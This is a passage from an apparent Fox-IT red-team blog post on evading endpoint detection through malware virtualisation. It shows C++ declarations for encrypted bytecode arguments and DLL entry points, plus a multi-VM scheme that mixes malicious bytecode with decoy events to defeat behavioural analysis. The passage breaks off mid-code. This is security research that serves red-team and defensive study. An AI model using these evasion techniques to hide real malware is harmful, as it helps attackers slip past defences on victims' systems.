          <td id="file-bytecode-cpp-LC3" class="blob-code blob-code-inner js-file-line">    uint8_t     key[KEY_SIZE];      // Decryption key of the payload</td>
        </tr>
        <tr>
          <td id="file-bytecode-cpp-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-bytecode-cpp-LC4" class="blob-code blob-code-inner js-file-line">    uint8_t     payload[0];         // Payload data </td>
        </tr>
        <tr>
          <td id="file-bytecode-cpp-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-bytecode-cpp-LC5" class="blob-code blob-code-inner js-file-line">};</td>
        </tr>
        <tr>
          <td id="file-bytecode-cpp-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-bytecode-cpp-LC6" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-bytecode-cpp-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-bytecode-cpp-LC7" class="blob-code blob-code-inner js-file-line">int bytecode_main(Data* data);</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>

</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/fox-srt/110e574a3af073a9bdd0a69aba82f7de/raw/6d370f74b9f361dcb01b091e982758b19cfa7ec1/bytecode.cpp" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/fox-srt/110e574a3af073a9bdd0a69aba82f7de#file-bytecode-cpp" class="Link--inTextBlock">
          bytecode.cpp
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>

</div></figure>



<p class="wp-block-paragraph">Accompanying this, each bytecode project contained a script that packaged data in a way that could be understood by the bytecode. However, there was no consistency between these scripts and the method of extraction. For example, extracting two 4-byte integers is simpler than extracting two strings due to their variable size.</p>



<p class="wp-block-paragraph">To standardize this process, and to include it into the building step itself instead of running a random script, a key-value solution was created in combination with an API that can interrogate the type and value of each argument. This is different from parameter packing that Cobalt Strike uses in its BOFs<sup data-fn="b4e4ab6a-3024-4673-b724-fea7bedd7042" class="fn"><a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#b4e4ab6a-3024-4673-b724-fea7bedd7042" id="b4e4ab6a-3024-4673-b724-fea7bedd7042-link">18</a></sup>, as default arguments, or arguments that are not strictly required are supported. Additionally, each argument is encrypted separately. This allows for a PE packer to extract domain-keying information before extracting the PE data.</p>



<p class="wp-block-paragraph">The following API is defined:</p>



<figure class="wp-block-embed is-type-rich is-provider-embed-handler wp-block-embed-embed-handler"><div class="wp-block-embed__wrapper">
<div style="tab-size: 8" id="gist132182111" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        
<div class="js-gist-file-update-container js-task-list-container">
      <div id="file-api-cpp" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="api.cpp content, created by fox-srt on 07:36AM on August 22, 2024.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  
  <div data-view-component="true" class="flash flash-warn flash-full d-flex flex-items-center">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <span>
      This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
      <a class="Link--inTextBlock" href="https://github.co/hiddenchars" target="_blank">Learn more about bidirectional Unicode characters</a>
    </span>


  <div data-view-component="true" class="flash-action">        <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/" data-view-component="true" class="btn-sm btn">    Show hidden characters
</a>
</div>
</div>

  <span aria-label="This line has hidden Unicode characters" data-view-component="true" class="line-alert tooltipped tooltipped-e">
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
</span>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="api.cpp">
        <tbody><tr>
          <td id="file-api-cpp-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-api-cpp-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-k">enum</span> Type {</td>
        </tr>
        <tr>
          <td id="file-api-cpp-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-api-cpp-LC2" class="blob-code blob-code-inner js-file-line">    Invalid, Boolean, Integer, String, Data</td>
        </tr>
        <tr>
          <td id="file-api-cpp-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-api-cpp-LC3" class="blob-code blob-code-inner js-file-line">};</td>
        </tr>
        <tr>
          <td id="file-api-cpp-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-api-cpp-LC4" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-api-cpp-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-api-cpp-LC5" class="blob-code blob-code-inner js-file-line"><span class="pl-k">struct</span> <span class="pl-en">Argument</span> {</td>
        </tr>
        <tr>
          <td id="file-api-cpp-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-api-cpp-LC6" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">size_t</span>      size;               <span class="pl-c"><span class="pl-c">//</span> The size of the argument including the header</span></td>
        </tr>
        <tr>
          <td id="file-api-cpp-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-api-cpp-LC7" class="blob-code blob-code-inner js-file-line">    Type        type;               <span class="pl-c"><span class="pl-c">//</span> The type of the argument</span></td>
        </tr>
        <tr>
          <td id="file-api-cpp-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-api-cpp-LC8" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">size_t</span>      tag;                <span class="pl-c"><span class="pl-c">//</span> The identifying tag of the argument</span></td>
        </tr>
        <tr>
          <td id="file-api-cpp-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-api-cpp-LC9" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint8_t</span>     key[KEY_SIZE];      <span class="pl-c"><span class="pl-c">//</span> The payload encryption key</span></td>
        </tr>
        <tr>
          <td id="file-api-cpp-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-api-cpp-LC10" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint8_t</span>     payload[<span class="pl-c1">0</span>];         <span class="pl-c"><span class="pl-c">//</span> The argument data</span></td>
        </tr>
        <tr>
          <td id="file-api-cpp-L11" class="blob-num js-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-api-cpp-LC11" class="blob-code blob-code-inner js-file-line">};</td>
        </tr>
        <tr>
          <td id="file-api-cpp-L12" class="blob-num js-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-api-cpp-LC12" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-api-cpp-L13" class="blob-num js-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-api-cpp-LC13" class="blob-code blob-code-inner js-file-line"><span class="pl-k">struct</span> <span class="pl-en">Arguments</span> {</td>
        </tr>
        <tr>
          <td id="file-api-cpp-L14" class="blob-num js-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-api-cpp-LC14" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">size_t</span>      size;               <span class="pl-c"><span class="pl-c">//</span> The total size of all arguments in bytes</span></td>
        </tr>
        <tr>
          <td id="file-api-cpp-L15" class="blob-num js-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-api-cpp-LC15" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">size_t</span>      count;              <span class="pl-c"><span class="pl-c">//</span> The count of arguments present in the argument pack</span></td>
        </tr>
        <tr>
          <td id="file-api-cpp-L16" class="blob-num js-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-api-cpp-LC16" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint8_t</span>     arguments[<span class="pl-c1">0</span>];       <span class="pl-c"><span class="pl-c">//</span> The argument data</span></td>
        </tr>
        <tr>
          <td id="file-api-cpp-L17" class="blob-num js-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-api-cpp-LC17" class="blob-code blob-code-inner js-file-line">};</td>
        </tr>
        <tr>
          <td id="file-api-cpp-L18" class="blob-num js-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-api-cpp-LC18" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-api-cpp-L19" class="blob-num js-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-api-cpp-LC19" class="blob-code blob-code-inner js-file-line"><span class="pl-k">bool</span> <span class="pl-en">has_argument</span>(Arguments* args, <span class="pl-c1">size_t</span> tag);</td>
        </tr>
        <tr>
          <td id="file-api-cpp-L20" class="blob-num js-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-api-cpp-LC20" class="blob-code blob-code-inner js-file-line">Argument* <span class="pl-en">get_argument_by_tag</span>(Arguments* args, <span class="pl-c1">size_t</span> tag);</td>
        </tr>
        <tr>
          <td id="file-api-cpp-L21" class="blob-num js-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-api-cpp-LC21" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">decrypt_argument</span>(Argument* arg);</td>
        </tr>
        <tr>
          <td id="file-api-cpp-L22" class="blob-num js-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-api-cpp-LC22" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">encrypt_argument</span>(Argument* arg);</td>
        </tr>
        <tr>
          <td id="file-api-cpp-L23" class="blob-num js-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-api-cpp-LC23" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-api-cpp-L24" class="blob-num js-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-api-cpp-LC24" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">//</span> utility functions to interpret the argument's payload</span></td>
        </tr>
        <tr>
          <td id="file-api-cpp-L25" class="blob-num js-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="file-api-cpp-LC25" class="blob-code blob-code-inner js-file-line"><span class="pl-k">bool</span> <span class="pl-en">get_argument_boolean</span>(Argument* arg);</td>
        </tr>
        <tr>
          <td id="file-api-cpp-L26" class="blob-num js-line-number js-blob-rnum" data-line-number="26"></td>
          <td id="file-api-cpp-LC26" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">int64_t</span> <span class="pl-en">get_argument_integer</span>(Argument* arg);</td>
        </tr>
        <tr>
          <td id="file-api-cpp-L27" class="blob-num js-line-number js-blob-rnum" data-line-number="27"></td>
          <td id="file-api-cpp-LC27" class="blob-code blob-code-inner js-file-line"><span class="pl-k">char</span>* <span class="pl-en">get_argument_string</span>(Argument* arg);</td>
        </tr>
        <tr>
          <td id="file-api-cpp-L28" class="blob-num js-line-number js-blob-rnum" data-line-number="28"></td>
          <td id="file-api-cpp-LC28" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span>* <span class="pl-en">get_argument_data</span>(Argument* arg, <span class="pl-c1">size_t</span>* size);</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>

</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/fox-srt/ab0928dbd0f37dda1fd977fb5621dd1a/raw/81bd9550b2cf2226d885d06980e376ef952d28e2/api.cpp" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/fox-srt/ab0928dbd0f37dda1fd977fb5621dd1a#file-api-cpp" class="Link--inTextBlock">
          api.cpp
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>

</div></figure>



<p class="wp-block-paragraph">The signature of the bytecode’s entry point is updated to incorporate this change:</p>



<figure class="wp-block-embed is-type-rich is-provider-embed-handler wp-block-embed-embed-handler"><div class="wp-block-embed__wrapper">
<div style="tab-size: 8" id="gist132182118" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        
<div class="js-gist-file-update-container js-task-list-container">
      <div id="file-bytecode_args-cpp" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="bytecode_args.cpp content, created by fox-srt on 07:36AM on August 22, 2024.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  
  <div data-view-component="true" class="flash flash-warn flash-full d-flex flex-items-center">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <span>
      This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
      <a class="Link--inTextBlock" href="https://github.co/hiddenchars" target="_blank">Learn more about bidirectional Unicode characters</a>
    </span>


  <div data-view-component="true" class="flash-action">        <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/" data-view-component="true" class="btn-sm btn">    Show hidden characters
</a>
</div>
</div>

  <span aria-label="This line has hidden Unicode characters" data-view-component="true" class="line-alert tooltipped tooltipped-e">
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
</span>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="bytecode_args.cpp">
        <tbody><tr>
          <td id="file-bytecode_args-cpp-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-bytecode_args-cpp-LC1" class="blob-code blob-code-inner js-file-line">int bytecode_main(Arguments* args);</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>

</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/fox-srt/5eb524a8e057a7dfbe63603904038a77/raw/27602331f09f56b0510fbc58d24fe308977b5ce7/bytecode_args.cpp" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/fox-srt/5eb524a8e057a7dfbe63603904038a77#file-bytecode_args-cpp" class="Link--inTextBlock">
          bytecode_args.cpp
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>

</div></figure>



<h2 class="wp-block-heading has-medium-font-size"><strong>Supporting DLLs</strong></h2>



<p class="wp-block-paragraph">Executables and DLLs are very similar in the way they look and in the way they execute. Both have an entry point to which execution is passed, and both return a value. However, the execution flow of an executable starts at the entry point, and does not reach its function’s end until the program stops. DLLs often perform very limited initialization within their entry point, and return execution to the loader to not lock the loader threads. Additionally, the entry point of the DLL is called more than once: on process startup and shutdown, and on thread creation and destruction. The reason for calling the entry point is passed by the loader in the second, <code>dwReason</code>, argument. This allows the code inside of the <code>DllMain</code> function to differentiate between the reasons the entry point was invoked, and can act accordingly.</p>



<figure class="wp-block-embed is-type-rich is-provider-embed-handler wp-block-embed-embed-handler"><div class="wp-block-embed__wrapper">
<div style="tab-size: 8" id="gist132182127" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        
<div class="js-gist-file-update-container js-task-list-container">
      <div id="file-dllmain-h" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="dllmain.h content, created by fox-srt on 07:37AM on August 22, 2024.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  
  <div data-view-component="true" class="flash flash-warn flash-full d-flex flex-items-center">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <span>
      This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
      <a class="Link--inTextBlock" href="https://github.co/hiddenchars" target="_blank">Learn more about bidirectional Unicode characters</a>
    </span>


  <div data-view-component="true" class="flash-action">        <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/" data-view-component="true" class="btn-sm btn">    Show hidden characters
</a>
</div>
</div>

  <span aria-label="This line has hidden Unicode characters" data-view-component="true" class="line-alert tooltipped tooltipped-e">
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
</span>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="dllmain.h">
        <tbody><tr>
          <td id="file-dllmain-h-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-dllmain-h-LC1" class="blob-code blob-code-inner js-file-line">BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>

</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/fox-srt/a4ffb0e69a3950845021c53041c3d627/raw/663b4a869278154570e94d5bdce41ecfb7a7b0a3/dllmain.h" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/fox-srt/a4ffb0e69a3950845021c53041c3d627#file-dllmain-h" class="Link--inTextBlock">
          dllmain.h
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>

</div></figure>



<p class="wp-block-paragraph">To allow our shellcode to be embedded within DLLs, both the virtual machine and its bytecode must be made aware of the reason for invocation. This requires the entry point of the virtual machine and bytecode to match that of a DLL, automatically receiving the reason by the OS loader. This does not interfere with the entry point used by a normal executable, as the default entry point of any executable does not take any arguments directly, but instead the arguments <code>argc</code> and <code>argv</code> are resolved by the C runtime, which is not linked against.</p>



<p class="wp-block-paragraph">On initialization, the virtual machine sets the bytecode’s <code>rdx</code> register to the value of its reason argument, passing the value to the entry point as the second argument. The programmer must decide if this value is to be inspected within the bytecode and should not use the value when writing bytecode to be embedded in an executable.</p>



<h2 class="wp-block-heading has-medium-font-size"><strong>Deceiving Behavioral Analysis: Multi-VM Execution</strong></h2>



<p class="wp-block-paragraph">Earlier, the method of detection based on behavior was discussed. This dynamic form of inspecting an application’s execution flow regardless of static patens is difficult for attackers to rid their malware of. Opening <code>Lsass.exe</code> and reading its memory could be marked as malicious, even if the process looks like <code>calc.exe</code>. Often, defensive products receive events by kernel callbacks, such as <code>PsSetCreateProcessNotifyRoutine</code><sup data-fn="c8fe9216-5079-4cf0-8cfe-7e8c5edd3e6f" class="fn"><a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#c8fe9216-5079-4cf0-8cfe-7e8c5edd3e6f" id="c8fe9216-5079-4cf0-8cfe-7e8c5edd3e6f-link">19</a></sup> or <code>PsSetLoadImageNotifyRoutine</code><sup data-fn="77d6f08a-3550-47cd-bb5d-28f618ff8a4e" class="fn"><a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#77d6f08a-3550-47cd-bb5d-28f618ff8a4e" id="77d6f08a-3550-47cd-bb5d-28f618ff8a4e-link">20</a></sup>, API/syscall hooks in the local process or by using Event Tracing for Windows (ETW)<sup data-fn="4ccf8e4c-c5db-4e01-a123-6be2ecc6bdc8" class="fn"><a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#4ccf8e4c-c5db-4e01-a123-6be2ecc6bdc8" id="4ccf8e4c-c5db-4e01-a123-6be2ecc6bdc8-link">21</a></sup> consumers.</p>



<p class="wp-block-paragraph">Patching hooks in the local process along with local ETW functions that provide events is trivial. This rids the process of intrusive monitoring by antivirus or EDR solutions, and stops the process from creating events. However, some events are still generated, mostly by the ETW providers present in the kernel, along with the kernel callbacks. Additionally, events created during patching could still be monitored. Lastly, blinding defensive products could have a negative effect, as failure to receiving check-ins could be considered an error and a signal of malicious behavior by itself.</p>



<p class="wp-block-paragraph">As an attacker, generating arbitrary events along with ones that might cause detection could be a method of thwarting dynamic detection rules based on behavior. Adding code to generate events in between regular instructions would require manipulation of source code, and is not preferred. Creating a new thread that generates random events could be in vain, as events are registered per unique thread in the process.</p>



<p class="wp-block-paragraph">The virtual machine was extended to support <code>vmcalls</code>. These types of <code>call</code> instructions made by the bytecode notify the virtual machine layer that a task needs to be performed. Among multiple different supported calls, most noteworthy are the following:</p>



<ul class="wp-block-list">
<li><code>vminit</code>: Initialize the virtual machine object with bytecode and arguments</li>



<li><code>vmexec</code>: Execute N cycles on the virtual machine</li>
</ul>



<p class="wp-block-paragraph">The combination of these two calls allows bytecode to create a new virtual machine, and execute a predetermined number of instructions:</p>



<figure class="wp-block-embed is-type-rich is-provider-embed-handler wp-block-embed-embed-handler"><div class="wp-block-embed__wrapper">
<div style="tab-size: 8" id="gist132182146" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        
<div class="js-gist-file-update-container js-task-list-container">
      <div id="file-vm_call-cpp" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="vm_call.cpp content, created by fox-srt on 07:38AM on August 22, 2024.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  
  <div data-view-component="true" class="flash flash-warn flash-full d-flex flex-items-center">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <span>
      This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
      <a class="Link--inTextBlock" href="https://github.co/hiddenchars" target="_blank">Learn more about bidirectional Unicode characters</a>
    </span>


  <div data-view-component="true" class="flash-action">        <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/" data-view-component="true" class="btn-sm btn">    Show hidden characters
</a>
</div>
</div>

  <span aria-label="This line has hidden Unicode characters" data-view-component="true" class="line-alert tooltipped tooltipped-e">
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
</span>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="vm_call.cpp">
        <tbody><tr>
          <td id="file-vm_call-cpp-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-vm_call-cpp-LC1" class="blob-code blob-code-inner js-file-line">#define NUM_CYCLES 200</td>
        </tr>
        <tr>
          <td id="file-vm_call-cpp-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-vm_call-cpp-LC2" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-vm_call-cpp-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-vm_call-cpp-LC3" class="blob-code blob-code-inner js-file-line">// load the malicious bytecode and create a vm object</td>
        </tr>
        <tr>
          <td id="file-vm_call-cpp-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-vm_call-cpp-LC4" class="blob-code blob-code-inner js-file-line">auto malicious = load_malicious_instructions();</td>
        </tr>
        <tr>
          <td id="file-vm_call-cpp-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-vm_call-cpp-LC5" class="blob-code blob-code-inner js-file-line">auto malicious_vm = allocate_vm_object();</td>
        </tr>
        <tr>
          <td id="file-vm_call-cpp-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-vm_call-cpp-LC6" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-vm_call-cpp-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-vm_call-cpp-LC7" class="blob-code blob-code-inner js-file-line">// load the bytecode creating events</td>
        </tr>
        <tr>
          <td id="file-vm_call-cpp-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-vm_call-cpp-LC8" class="blob-code blob-code-inner js-file-line">auto events = load_event_bytecode();</td>
        </tr>
        <tr>
          <td id="file-vm_call-cpp-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-vm_call-cpp-LC9" class="blob-code blob-code-inner js-file-line">auto events_vm = allocate_vm_object();</td>
        </tr>
        <tr>
          <td id="file-vm_call-cpp-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-vm_call-cpp-LC10" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-vm_call-cpp-L11" class="blob-num js-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-vm_call-cpp-LC11" class="blob-code blob-code-inner js-file-line">// initialize the vm objects with their bytecode and no arguments</td>
        </tr>
        <tr>
